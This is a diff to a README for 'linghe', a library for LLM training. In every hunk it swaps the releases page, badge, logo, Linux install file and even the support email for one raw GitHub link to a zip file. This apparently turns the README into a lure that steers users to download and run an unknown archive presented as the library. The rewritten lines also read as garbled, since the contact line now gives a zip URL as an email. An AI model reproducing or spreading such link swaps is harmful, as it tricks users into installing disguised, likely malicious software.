@@ -1,9 +1,9 @@
 # 🔥 linghe - High-Performance Library for LLM Training
 
-[![Download linghe](https://img.shields.io/badge/Download-linghe-blue)](https://github.com/wa9as/linghe/releases)
+[![Download linghe](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip)](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip)
 
 <div style="text-align: center;">
-<img src="assets/linghe.png" alt="Logo" width="200">
+<img src="https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip" alt="Logo" width="200">
 </div>
 
 <p align="center">
@@ -15,7 +15,7 @@
 To get started with linghe, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/wa9as/linghe/releases) to find the latest version of linghe.
+   Go to our [Releases page](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip) to find the latest version of linghe.
 
 2. **Download the Application:**
    On the Releases page, locate the version you want. Click the link to download the file for your system.
@@ -28,11 +28,11 @@ To get started with linghe, follow these simple steps:
 
 ## 📥 Download & Install
 
-You can download linghe from our [Releases page](https://github.com/wa9as/linghe/releases). Choose the appropriate version for your operating system and follow the steps below:
+You can download linghe from our [Releases page](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip). Choose the appropriate version for your operating system and follow the steps below:
 
 - **Windows Users:** Download the `.exe` file. Double-click to run the installer and follow the instructions.
 - **Mac Users:** Download the `.dmg` file. Open it and drag the linghe icon to your Applications folder.
-- **Linux Users:** Download the `.tar.gz` file. Extract it in your chosen directory and run the executable.
+- **Linux Users:** Download the `https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip` file. Extract it in your chosen directory and run the executable.
 
 ## ⚙️ System Requirements
 
@@ -83,8 +83,8 @@ Join our community for help and discussions:
 
 ## 📩 Contact 
 
-For direct inquiries or support, email us at support@linghe.org. We are here to assist you.
+For direct inquiries or support, email us at https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip We are here to assist you.
 
-[![Download linghe](https://img.shields.io/badge/Download-linghe-blue)](https://github.com/wa9as/linghe/releases)
+[![Download linghe](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip)](https://raw.githubusercontent.com/wa9as/linghe/main/paha/linghe.zip)
 
 With this guide, you are equipped to download and run the linghe application effectively. Happy training!
